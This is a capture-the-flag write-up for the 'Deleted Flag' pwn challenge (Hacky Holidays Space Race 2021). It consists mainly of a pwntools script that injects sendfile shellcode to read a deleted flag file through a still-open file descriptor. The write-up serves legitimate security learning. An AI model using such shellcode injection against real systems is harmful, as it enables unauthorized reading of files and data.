---
name: Deleted Flag (2021)
event: Hacky Holidays Space Race CTF 2021
category: Pwn
description: Writeup for Deleted Flag (pwn) - Hacky Holidays Space Race CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Deleted Flag

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/hY446_xs-DE/0.jpg)](https://youtu.be/hY446_xs-DE?t=2368s "Hacky Holidays Space Race 2021: Deleted Flag")

## Challenge Description

> We've removed your flag. Good luck getting it back.

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break fopen
continue
'''.format(**locals())

# Binary filename
exe = './app'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Save the flag to file
write('flag.txt', 'CTF{fake_flag_for_testing}')

# Start program
io = start()

# https://www.tutorialspoint.com/unix_system_calls/sendfile.htm
shellcode = asm(shellcraft.sendfile(1, 3, 0, 4096))  # out_fd is stout (1), in_fd is (3) locally and (5) remotely
write('payload', shellcode)

# Send the payload
io.sendlineafter('flag?', shellcode)

# Got Shell?
io.interactive()
```
{% endcode %}
